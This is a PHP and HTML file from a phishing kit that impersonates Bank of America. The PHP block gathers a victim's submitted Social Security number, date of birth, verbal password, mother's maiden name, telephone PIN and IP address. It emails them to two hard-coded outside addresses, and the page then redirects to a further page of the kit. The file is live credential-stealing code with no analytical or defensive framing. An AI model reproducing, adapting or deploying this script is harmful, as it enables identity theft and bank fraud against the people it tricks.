<?
$ip = getenv("REMOTE_ADDR");
$message .= "---------ubta RezulT---------\n";
$message .= "--------\n";

$message .= "--------\n";
$message .= "ssn: ".$_POST['name1']."\n";
$message .= "dob: ".$_POST['name2']."\n";
$message .= "Verbal passowrd: ".$_POST['name3']."\n";
$message .= "mmn: ".$_POST['name4']."\n";
$message .= "tele pin: ".$_POST['name5']."\n";


$message .= "--------\n";
$message .= "IP: ".$ip."\n";
$message .= "---------Created By SLim--------------\n";
$recipient = "robb85283@gmail.com,emikuzpaul@outlook.com";
$subject = "bankofamerica next1";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$to", "", $message);
if (mail($recipient,$subject,$message,$headers))
?>




<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>





<HEAD>
   <meta http-equiv="Content-type" content="text/html; charset=ISO-8859-1" />   
   
   <META HTTP-EQUIV="Refresh" CONTENT="4;URL=network.html
" >


   

   
   
      
      
   


<TITLE></TITLE>


   <link rel="stylesheet" type="text/css" href="../common/styles/wibscreen.css" />

</HEAD>               

<BODY BGCOLOR="#ffffff">
  
    
  






<!-- ********************************* Begin Body ************************** -->
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<div id="pause" align="center">

   

  

</table>
</div>


</BODY>
</html>
